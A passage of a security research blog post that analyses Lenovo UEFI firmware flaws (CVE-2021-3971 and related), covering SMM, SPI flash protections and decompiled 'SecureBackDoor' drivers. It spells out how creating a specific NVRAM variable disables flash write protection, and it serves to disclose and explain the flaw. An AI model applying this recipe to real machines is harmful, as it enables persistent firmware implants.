<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setfirmwareenvironmentvariablea" target="_blank" rel="noopener"><em>SetFirmwareEnvironmentVariable</em></a> ‚Äì write/delete variable</li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getfirmwareenvironmentvariablea" target="_blank" rel="noopener"><em>GetFirmwareEnvironmentVariable</em></a> ‚Äì read variable</li>
</ul>
<h3>System Management Mode (SMM)</h3>
<p>SMM is a highly privileged execution mode of x86 processors, often referred to as ‚Äúring¬†‚Äë2‚Äù.</p>
<p>SMM code is written within the context of the system firmware and is usually used for various tasks including advanced power management, execution of OEM proprietary code, and secure firmware updates. It provides an independent execution environment completely invisible to the running operating system, and the code and data used in SMM are stored in hardware-protected memory ‚Äì accessible only from SMM ‚Äì called SMRAM.</p>
<p>To enter SMM, a special processor interrupt called SMI (System Management Interrupt) needs to be triggered. SMIs can be triggered via software means or by the platform hardware. For the purposes of this blogpost, it‚Äôs sufficient to understand that one of the ways to generate an SMI (specifically a software SMI ‚Äì SW SMI) and enter SMM on Intel architecture systems is to write to I/O port 0xB2 (using the <a href="https://www.felixcloutier.com/x86/out" target="_blank" rel="noopener"><em>OUT</em></a> instruction). This is often used by software to invoke firmware services <strong>during system runtime</strong>.</p>
<h4><em><strong>Defining SW SMI handlers in the UEFI firmware</strong></em></h4>
<p>To understand what happens under the hood when we use the above-mentioned method of triggering an SW SMI, we need to look into volume 4 of the <a href="http://www.uefi.org/sites/default/files/resources/PI_1_4.zip" target="_blank" rel="noopener"><em>UEFI Platform Initialization Specification, Version 1.4</em></a> (ZIP archive), and find the definition of the <span style="font-family: 'courier new', courier, monospace;">EFI_SMM_SW_DISPATCH2_PROTOCOL</span> (shown in Figure 1).</p>
<div id="attachment_161471" style="width: 610px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-1.-EFI_SMM_SW_DISPATCH2_PROTOCOL-definition.jpg"><img class="wp-image-161471" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-1.-EFI_SMM_SW_DISPATCH2_PROTOCOL-definition.jpg" alt="" width="600" height="135" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-1.-EFI_SMM_SW_DISPATCH2_PROTOCOL-definition.jpg 905w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-1.-EFI_SMM_SW_DISPATCH2_PROTOCOL-definition-300x68.jpg 300w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-1.-EFI_SMM_SW_DISPATCH2_PROTOCOL-definition-768x173.jpg 768w" sizes="(max-width: 600px) 100vw, 600px" /></a><p class="wp-caption-text"><em>Figure 1.</em> <span style="font-family: courier new, courier, monospace;">EFI_SMM_SW_DISPATCH2_PROTOCOL</span> <em>definition</em></p></div>
<p>As written in the specification, this protocol can be used by SMM modules to install handler functions that will respond to specific software interrupts.</p>
<p>To install such a handler function, the <span style="font-family: 'courier new', courier, monospace;">EFI_SMM_SW_DISPATCH2_PROTOCOL.Register</span> service function is used; the function type definition is shown in Figure 2.</p>
<div id="attachment_161473" style="width: 610px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-2.-EFI_SMM_SW_DISPATCH2_PROTOCOL.Register-function-definition.png"><img class="wp-image-161473" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-2.-EFI_SMM_SW_DISPATCH2_PROTOCOL.Register-function-definition-300x85.png" alt="" width="600" height="170" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-2.-EFI_SMM_SW_DISPATCH2_PROTOCOL.Register-function-definition-300x85.png 300w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-2.-EFI_SMM_SW_DISPATCH2_PROTOCOL.Register-function-definition-768x218.png 768w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-2.-EFI_SMM_SW_DISPATCH2_PROTOCOL.Register-function-definition.png 939w" sizes="(max-width: 600px) 100vw, 600px" /></a><p class="wp-caption-text"><em>Figure 2.</em> <span style="font-family: courier new, courier, monospace;">EFI_SMM_SW_DISPATCH2_PROTOCOL.Register</span><em> function definition</em></p></div>
<p>This service installs a <span style="font-family: 'courier new', courier, monospace;">DispatchFunction</span> function that will be called when the software SMI source specified by <span style="font-family: 'courier new', courier, monospace;">RegisterContext‚Äë&gt;SwSmiInputValue</span> is detected. In other words, this <span style="font-family: 'courier new', courier, monospace;">DispatchFunction</span> will be called when we generate an SW SMI interrupt by writing the same <span style="font-family: 'courier new', courier, monospace;">SwSmiInputValue</span> as was specified in the <span style="font-family: 'courier new', courier, monospace;">RegisterContext‚Äë&gt;SwSmiInputValue</span> during handler installation, to the I/O port <span style="font-family: 'courier new', courier, monospace;">0xB2</span>.</p>
<p>For the SW SMI interrupts, parameters are most often passed to the SMI handler using CPU registers. When the SW SMI interrupt is triggered, the context for all of the CPUs at the time of triggering the interrupt is saved to the SMRAM. The invoked SMI handler can easily read and modify this context using the <span style="font-family: 'courier new', courier, monospace;">EFI_SMM_CPU_PROTOCOL</span> functions <span style="font-family: 'courier new', courier, monospace;">ReadSaveState</span> and <span style="font-family: 'courier new', courier, monospace;">WriteSaveState</span>, respectively.</p>
<h3>Primary SPI flash protection mechanisms</h3>
<p>UEFI firmware usually resides in the embedded flash memory chip located on the computer‚Äôs motherboard (SPI flash chip). It‚Äôs non-volatile memory and it is connected to the processor via the <a href="https://en.wikipedia.org/wiki/Serial_Peripheral_Interface" target="_blank" rel="noopener"><em>Serial Peripheral Interface (SPI)</em></a>.</p>
<p>This memory is not affected by operating system reinstallation and therefore presents a tempting target for threat actors deploying their implants ‚Äì as was the case of <a href="https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf" target="_blank" rel="noopener"><em>LoJax</em></a>, <a href="https://securelist.com/mosaicregressor/98849/" target="_blank" rel="noopener"><em>MosaicRegressor</em></a>, and <a href="https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/" target="_blank" rel="noopener"><em>MoonBounce</em></a>.</p>
<p>Several security mechanisms are available for the prevention of unwanted modifications of the SPI flash and the primary line of defense is provided by the special memory-mapped configuration registers exposed by the chipset itself ‚Äì the BIOS Control Register and five Protected Range registers.</p>
<h4><strong><em>BIOS Control Register</em></strong></h4>
<p>In this register, three specific bits are used for SPI flash access control. Note that although they may be named differently on other chipsets, the principle is the same.</p>
<ol>
<li>BIOSWE (bit 0)</li>
</ol>
<p style="padding-left: 30px;">When set, access to the BIOS space is enabled for both read and write cycles, otherwise access is read only.</p>
<ol start="2">
<li>BLE (bit 1)</li>
</ol>
<p style="padding-left: 30px;">When set, BIOSWE could be set from 0 to 1 only by SMM code. Any attempt to set BIOSWE from non-SMM code will trigger SMI. This provides an opportunity for the OEM to implement an SMI handler to protect the BIOSWE bit by setting it back to 0.</p>
<ol start="3">
<li>SMM_BWP (bit 5)</li>
</ol>
<p style="padding-left: 30px;">When set, the BIOS region is not writable unless all processors are in SMM and BIOSWE is 1. Setting this bit resolves the <a href="https://bromiumlabs.files.wordpress.com/2015/01/speed_racer_whitepaper.pdf" target="_blank" rel="noopener"><em>Speed Racer</em></a> race condition vulnerability (an exploit for this vulnerability was present in the <span style="font-family: 'courier new', courier, monospace;">ReWriter_binary</span> tool, which was used by the Sednit group to deploy <a href="https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf" target="_blank" rel="noopener"><em>LoJax</em></a>).</p>
<h4><strong><em>Protected Range registers (PR0-PR4)</em></strong></h4>
<p>Each register specifies independent read/write permissions for a specific range of SPI Flash BIOS region memory. They can be set only if the Flash Configuration Lock-Down (FLOCKDN) bit in Hardware Sequencing Flash Status (HSFS) register is not set.</p>
<p>This FLOCKDN bit should be set by the platform firmware during platform initialization &#8211; right after setting the Protected Range (PR) registers. Once FLOCKDN is set, it is cleared only after the next hardware reset. It means that memory ranges protected by Protected Range registers can‚Äôt be modified by any runtime code (including SMM code) after they are locked. Even legitimate firmware updates must be performed before PR registers are locked.</p>
<h4><strong><em>Solutions available on current systems</em></strong></h4>
<p>Modern systems nowadays usually come with solutions providing hardware-based boot integrity (such as Intel Boot Guard) which, if configured properly and without additional vulnerabilities, protects from booting untrusted firmware code even if the above-mentioned chipset-provided protections fail to protect the SPI flash due to misconfiguration or vulnerability.</p>
<h4><strong><em>How to access PCI/PCIe configuration space</em></strong></h4>
<p>The BIOS Control Register, Protection Range registers, and many other configuration registers can be read or written by accessing the PCI(e) configuration space. The location (or address) of the PCI(e) configuration space for the specific PCI-compatible devices (e.g., SPI flash) is specified by the three values:</p>
<ul>
<li>Bus</li>
<li>Device</li>
<li>Function</li>
</ul>
<p>Configurations related to this device are located at the offsets within this configuration space. There are two common ways to access the PCI(e) configuration space:</p>
<ul>
<li><strong>Using port I/O</strong></li>
</ul>
<p>In this case, machine I/O instructions <a href="https://c9x.me/x86/html/file_module_x86_id_139.html" target="_blank" rel="noopener"><em>IN</em></a> and <a href="https://c9x.me/x86/html/file_module_x86_id_222.html" target="_blank" rel="noopener"><em>OUT</em></a> in combination with 0xCF8 (CONFIG_ADDRESS) and 0xCFC (CONFIG_DATA) I/O ports are used to access specific configuration data in PCI configuration space. As it is not necessary for the purpose of our blogpost, we will not be diving into the details here.</p>
<ul>
<li><strong>Using Memory Mapped I/O (MMIO)</strong></li>
</ul>
<p>When using Memory-Mapped I/O, the PCI configuration space is mapped directly to main memory address space; therefore, the configuration data can be accessed almost the same way as any other data. All that needs to be known is the PCI address of the desired data, so where can we find this address? We can construct it on our own if we know:</p>
<ol>
<li>the <strong>MMIO base address</strong> (can be found inside <a href="https://wiki.osdev.org/PCI_Express" target="_blank" rel="noopener"><em>MCFG</em></a> ACPI table)</li>
<li><strong>Bus</strong>, <strong>Device</strong>, <strong>Function</strong>, and <strong>Offset</strong> (also referred to as <strong>Register</strong>) values identifying the data that we want to access (you can find them in a chipset‚Äôs datasheet).</li>
</ol>
<p>An example of the macro encoding these values into PCI address can be found in EDK2‚Äôs <a href="https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/PciLib.h#L34" target="_blank" rel="noopener"><em>PciLib.h</em></a> header file. Alternatively, a Python implementation of the functions translating MMIO PCI address to individual identifiers and vice versa is shown in Figure 3.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-625eed6ab2260370717956" class="crayon-syntax crayon-theme-classic crayon-font-consolas crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 10px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 10px !important; line-height: 15px !important;">
# returns address relative to the PciExpressBaseAddress
def pci_encode_to_addr(bus,device,function,register,mmio_base=0xE0000000):
	return mmio_base|(((register) &amp; 0xFFF) | (((function) &amp; 0x07) &lt;&lt; 12) | (((device) &amp; 0x1F) &lt;&lt; 15) | (((bus) &amp; 0xFF) &lt;&lt; 20))

def pci_decode_from_addr(addr):
	bus = (addr &gt;&gt; 20) &amp; 0xFF
	device = (addr &gt;&gt; 15) &amp; 0x1F
	function = (addr &gt;&gt; 12) &amp; 0x7
	offset = addr &amp; 0xFFF
	print(f"Bus: 0x{bus:X} Device: 0x{device:X} Function: 0x{function:X} Offset: 0x{offset:X}")</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 10px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-625eed6ab2260370717956-1">1</div><div class="crayon-num" data-line="crayon-625eed6ab2260370717956-2">2</div><div class="crayon-num" data-line="crayon-625eed6ab2260370717956-3">3</div><div class="crayon-num" data-line="crayon-625eed6ab2260370717956-4">4</div><div class="crayon-num" data-line="crayon-625eed6ab2260370717956-5">5</div><div class="crayon-num" data-line="crayon-625eed6ab2260370717956-6">6</div><div class="crayon-num" data-line="crayon-625eed6ab2260370717956-7">7</div><div class="crayon-num" data-line="crayon-625eed6ab2260370717956-8">8</div><div class="crayon-num" data-line="crayon-625eed6ab2260370717956-9">9</div><div class="crayon-num" data-line="crayon-625eed6ab2260370717956-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 10px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-625eed6ab2260370717956-1"><span class="crayon-c"># returns address relative to the PciExpressBaseAddress</span></div><div class="crayon-line" id="crayon-625eed6ab2260370717956-2"><span class="crayon-r">def</span><span class="crayon-h"> </span><span class="crayon-e">pci_encode_to_addr</span><span class="crayon-sy">(</span><span class="crayon-v">bus</span><span class="crayon-sy">,</span><span class="crayon-k ">device</span><span class="crayon-sy">,</span><span class="crayon-v">function</span><span class="crayon-sy">,</span><span class="crayon-v">register</span><span class="crayon-sy">,</span><span class="crayon-v">mmio_base</span><span class="crayon-o">=</span><span class="crayon-cn">0xE0000000</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-625eed6ab2260370717956-3"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">mmio_base</span><span class="crayon-o">|</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">register</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0xFFF</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">function</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0x07</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&lt;&lt;</span><span class="crayon-h"> </span><span class="crayon-cn">12</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-k ">device</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0x1F</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&lt;&lt;</span><span class="crayon-h"> </span><span class="crayon-cn">15</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">bus</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0xFF</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&lt;&lt;</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-625eed6ab2260370717956-4">&nbsp;</div><div class="crayon-line" id="crayon-625eed6ab2260370717956-5"><span class="crayon-r">def</span><span class="crayon-h"> </span><span class="crayon-e">pci_decode_from_addr</span><span class="crayon-sy">(</span><span class="crayon-v">addr</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-625eed6ab2260370717956-6"><span class="crayon-h">	</span><span class="crayon-v">bus</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">addr</span><span class="crayon-h"> </span><span class="crayon-o">&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0xFF</span></div><div class="crayon-line" id="crayon-625eed6ab2260370717956-7"><span class="crayon-h">	</span><span class="crayon-k ">device</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">addr</span><span class="crayon-h"> </span><span class="crayon-o">&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">15</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0x1F</span></div><div class="crayon-line" id="crayon-625eed6ab2260370717956-8"><span class="crayon-h">	</span><span class="crayon-v">function</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">addr</span><span class="crayon-h"> </span><span class="crayon-o">&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">12</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0x7</span></div><div class="crayon-line" id="crayon-625eed6ab2260370717956-9"><span class="crayon-h">	</span><span class="crayon-v">offset</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">addr</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0xFFF</span></div><div class="crayon-line" id="crayon-625eed6ab2260370717956-10"><span class="crayon-h">	</span><span class="crayon-k ">print</span><span class="crayon-sy">(</span><span class="crayon-i">f</span><span class="crayon-s">"Bus: 0x{bus:X} Device: 0x{device:X} Function: 0x{function:X} Offset: 0x{offset:X}"</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p><em>Figure 3. PCI address encoding/decoding in Python</em></p>
<h3>UEFI Secure Boot</h3>
<p>UEFI Secure Boot is defined in the UEFI specification, and its main purpose is to verify the integrity of the boot components to ensure that only components trusted by the platform are allowed to be executed. What components will be included in this verification process depends on the UEFI Secure Boot policy implementation in the specific platform ‚Äì in most cases, only third-party UEFI drivers, applications and <a href="https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/uefi-validation-option-rom-validation-guidance" target="_blank" rel="noopener"><em>OPROMs</em></a> are being verified, and the drivers on the SPI flash are implicitly considered trusted.</p>
<p>To decide what is trusted and what is not, UEFI Secure Boot uses special databases stored in the authenticated NVRAM variables, namely <span style="font-family: 'courier new', courier, monospace;">db</span> and <span style="font-family: 'courier new', courier, monospace;">dbx</span>.</p>
<ul>
<li>The <strong>db</strong><strong> database</strong> contains a list of trusted public key certificates that are authorized to authenticate boot component signatures or, in addition to the certificates, it can also contain a list of hashes of the components that are allowed to be executed whether or not they are signed.</li>
<li>The <strong>dbx</strong><strong> database</strong> contains public key certificates or hashes of UEFI executables that are <strong>not</strong> allowed to be executed ‚Äì to prevent execution of signed executables with known vulnerabilities, revoked certificates, etc.</li>
</ul>
<h2>Technical analysis</h2>
<p>We start with our analysis of the Lenovo drivers affected by <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3971" target="_blank" rel="noopener"><em>CVE-2021-3971</em></a> and <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3972" target="_blank" rel="noopener"><em>CVE-2021-3972</em></a>, and then continue with the SMM vulnerability¬†<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3970" target="_blank" rel="noopener"><em>CVE-2021-3970</em></a>.</p>
<p>At the beginning of our blogpost, we mentioned that the <span style="font-family: 'courier new', courier, monospace;">SecureBackDoor</span>* and <span style="font-family: 'courier new', courier, monospace;">ChgBoot</span>* drivers share some common characteristics, so what is the connection between them? Both use the UEFI variables within the <span style="font-family: 'courier new', courier, monospace;">6ACCE65D-DA35-4B39-B64B-5ED927A7DC7E</span> namespace as a control mechanism for deciding whether to activate their functionality (we will refer to this GUID as <span style="font-family: 'courier new', courier, monospace;">LENOVO_BACKDOOR_NAMESPACE_GUID</span>).</p>
<h3>CVE-2021-3971 ‚Äì SecureBackDoor driver ‚Äì disable SPI flash protections</h3>
<p>We will start with the analysis of the <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3971" target="_blank" rel="noopener"><em>CVE-2021-3971</em></a> vulnerability, which allows an attacker to disable SPI flash write-protections mechanisms by simply creating the NVRAM variable. When platform firmware detects this NVRAM variable during bootup, it skips execution of the code responsible for the setting up BIOS Control Register and Protected Range register-based SPI flash protections.</p>
<p>As a result, the exploited system will allow modification of the SPI flash even when done from non-SMM code and thus allow an attacker to deploy malicious code directly to the firmware storage.</p>
<p>This ‚ÄúDisable SPI flash protections feature‚Äù is implemented by the following drivers in the firmware of affected laptops:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">SecureBackDoorPeim (16F41157-1DE8-484E-B316-DDB77CB4080C)</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">SecureBackDoor (32F16D8C-C094-4102-BD6C-1E533F8810F4)</span></li>
</ul>
<p>To disable or deactivate the above-mentioned SPI flash protections by exploiting this vulnerability, the user only needs to create an NVRAM variable with:</p>
<ul>
<li>Name: <span style="font-family: 'courier new', courier, monospace;">cE!</span></li>
<li>Namespace GUID: <span style="font-family: 'courier new', courier, monospace;">LENOVO_BACKDOOR_NAMESPACE_GUID</span></li>
<li>Attributes: NV + BS + RT (<span style="font-family: 'courier new', courier, monospace;">0x00000007</span>)</li>
<li>Value: Any non-null byte</li>
</ul>
<p>and then restart the affected device.</p>
<p>To understand how easy this is, Windows users can disable these protections by exploiting the <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3971" target="_blank" rel="noopener"><em>CVE-2021-3971</em></a> vulnerability directly from the privileged userland process (administrator with <a href="https://docs.microsoft.com/en-us/windows/desktop/SecAuthZ/privilege-constants" target="_blank" rel="noopener"><em>SE_SYSTEM_ENVIRONMENT_NAME</em></a> privilege) using the Windows API function <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setfirmwareenvironmentvariableexa" target="_blank" rel="noopener"><em>SetFirmwareEnvironmentVariable</em></a>.</p>
<p>In our analysis, we will work with the firmware image (<strong>version 1GCN25WW</strong>) of the <strong>Lenovo 110-15IBR</strong>, which is one of the devices affected by the <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3971"><em>CVE-2021-3971</em></a> vulnerability.</p>
<h4><strong><em>SecureBackDoorPeim analysis</em></strong></h4>
<p>To return to a bit of theory, the UEFI boot sequence consists of various phases and one of the earliest is called the Pre-EFI Initialization (PEI) phase. During this phase, Pre-EFI Initialization Modules (PEIMs) are executed to perform various tasks including initialization of permanent memory and invocation of the next boot phase ‚Äì Driver Execution Environment (DXE). To pass information from the PEI phase to the DXE phase, special data structures called Hand-Off Blocks (HOBs) are used.</p>
<p><span style="font-family: 'courier new', courier, monospace;">SecureBackDoorPeim</span> is a PEI module responsible for both reading the content of the UEFI variable <span style="font-family: 'courier new', courier, monospace;">cE!</span>, which belongs to the namespace <span style="font-family: 'courier new', courier, monospace;">LENOVO_BACKDOOR_NAMESPACE_GUID</span>, and preparing the correct HOB data structure to pass its value to the <span style="font-family: 'courier new', courier, monospace;">SecureBackDoor</span> DXE phase driver.</p>
<p>It does so in three simple steps, as shown in Figure 4.</p>
<div id="attachment_161474" style="width: 810px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-4.-Hex-Rays-decompiled-code-of-SecureBackDoorPeim-module.png"><img class="wp-image-161474" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-4.-Hex-Rays-decompiled-code-of-SecureBackDoorPeim-module-300x135.png" alt="" width="800" height="359" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-4.-Hex-Rays-decompiled-code-of-SecureBackDoorPeim-module-300x135.png 300w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-4.-Hex-Rays-decompiled-code-of-SecureBackDoorPeim-module-768x345.png 768w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-4.-Hex-Rays-decompiled-code-of-SecureBackDoorPeim-module-1024x460.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-4.-Hex-Rays-decompiled-code-of-SecureBackDoorPeim-module.png 1292w" sizes="(max-width: 800px) 100vw, 800px" /></a><p class="wp-caption-text"><em>Figure 4. Hex-Rays-decompiled code of</em> <span style="font-family: courier new, courier, monospace;">SecureBackDoorPeim</span><em> module</em></p></div>
<ol>
<li>Use <span style="font-family: 'courier new', courier, monospace;">EFI_PEI_READ_ONLY_VARIABLE2_PPI.GetVariable¬†</span>function with the VariableName and VariableGuid parameters set to values <span style="font-family: 'courier new', courier, monospace;">cE!</span> and <span style="font-family: 'courier new', courier, monospace;">LENOVO_BACKDOOR_NAMESPACE_GUID</span> respectively.</li>
<li>To pass this information to the <span style="font-family: 'courier new', courier, monospace;">SecureBackDoor</span> DXE driver, create a HOB data structure identified by the following GUID <span style="font-family: 'courier new', courier, monospace;">AD7934E7-D800-4305-BF6F-49ED9918E1AB</span>. To make things simpler, let‚Äôs name this HOB data structure GUID <span style="font-family: 'courier new', courier, monospace;">SECURE_BACKDOOR_HOB_GUID</span>.</li>
<li>Finally, it saves the value retrieved from the <span style="font-family: 'courier new', courier, monospace;">cE!</span> variable to offset 0x18 of the newly created HOB.</li>
</ol>
<h4><strong><em>SecureBackDoor analysis</em></strong></h4>
<p><span style="font-family: 'courier new', courier, monospace;">SecureBackDoor</span> is a DXE driver responsible for deactivating SPI flash protections if it finds a HOB identified by <span style="font-family: 'courier new', courier, monospace;">SECURE_BACKDOOR_HOB_GUID</span> in the HOB list. In Figure 5 we can see that to find this HOB, it walks through the list of HOBs, and looks for the one created previously by the <span style="font-family: 'courier new', courier, monospace;">SecureBackDoorPeim</span> module by matching it with the <span style="font-family: 'courier new', courier, monospace;">SECURE_BACKDOOR_HOB_GUID</span>.</p>
<div id="attachment_161477" style="width: 955px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-5.-Hex-Rays-decompiled-SecureBackDoor-code-responsible-for-finding-HOB-created-by-SecureBackdoorPeim.png"><img class="wp-image-161477 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-5.-Hex-Rays-decompiled-SecureBackDoor-code-responsible-for-finding-HOB-created-by-SecureBackdoorPeim.png" alt="" width="945" height="204" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-5.-Hex-Rays-decompiled-SecureBackDoor-code-responsible-for-finding-HOB-created-by-SecureBackdoorPeim.png 945w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-5.-Hex-Rays-decompiled-SecureBackDoor-code-responsible-for-finding-HOB-created-by-SecureBackdoorPeim-300x65.png 300w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-5.-Hex-Rays-decompiled-SecureBackDoor-code-responsible-for-finding-HOB-created-by-SecureBackdoorPeim-768x166.png 768w" sizes="(max-width: 945px) 100vw, 945px" /></a><p class="wp-caption-text"><em>Figure 5. Hex-Rays-decompiled</em> <span style="font-family: courier new, courier, monospace;">SecureBackDoor</span><em> code responsible for finding HOB created by</em> <span style="font-family: courier new, courier, monospace;">SecureBackdoorPeim</span></p></div>
<p>If this HOB is found, the driver gets the byte value at offset <span style="font-family: 'courier new', courier, monospace;">0x18</span> ‚Äì which is the value previously retrieved from the <span style="font-family: 'courier new', courier, monospace;">cE!</span> UEFI variable by <span style="font-family: 'courier new', courier, monospace;">SecureBackDoorPeim</span> &#8211; and if this value is different from <span style="font-family: 'courier new', courier, monospace;">0x00</span>, it registers the <span style="font-family: 'courier new', courier, monospace;">DXE_PCH_PLATFORM_POLICY_PROTOCOL</span> protocol notify function that zeroes the <span style="font-family: 'courier new', courier, monospace;">BiosLock</span> bit inside the <span style="font-family: 'courier new', courier, monospace;">DXE_PCH_PLATFORM_POLICY_PROTOCOL.LockDownConfig</span> bitmask (for related type definitions, see TianoCore‚Äôs <a href="https://github.com/tianocore/edk2-platforms/blob/master/Silicon/Intel/Vlv2DeviceRefCodePkg/ValleyView2Soc/SouthCluster/Include/Protocol/PchPlatformPolicy.h" target="_blank" rel="noopener"><em>PchPlatformPolicy.h</em></a> header file at GitHub).</p>
<p>To understand how it actually disables SPI flash protections, we need to look into two different firmware drivers:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">PchBiosWriteProtect (B8B8B609-0B6C-4B8C-A731-DE03A6C3F3DC)</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">BiosRegionLock (77892615-7C7A-4AEF-A320-2A0C15C44B95)</span></li>
</ul>
<h4><strong><em>PchBiosWriteProtect analysis</em></strong></h4>
<p><span style="font-family: 'courier new', courier, monospace;">PchBiosWriteProtect</span> is a SMM module. In Figure 6 we can see that it checks whether the BiosLock bit inside <span style="font-family: 'courier new', courier, monospace;">DXE_PCH_PLATFORM_POLICY_PROTOCOL.LockDownConfig</span> (type <a href="https://github.com/tianocore/edk2-platforms/blob/60d6b7c751bbad5ccc15d276a170d6dd638bd88e/Silicon/Intel/Vlv2DeviceRefCodePkg/ValleyView2Soc/SouthCluster/Include/Protocol/PchPlatformPolicy.h#L453" target="_blank" rel="noopener"><em>PCH_LOCK_DOWN_CONFIG</em></a>) is set, by performing a bitwise AND operation with value <span style="font-family: 'courier new', courier, monospace;">0x08</span> (which is 0b1000 in binary representation).</p>
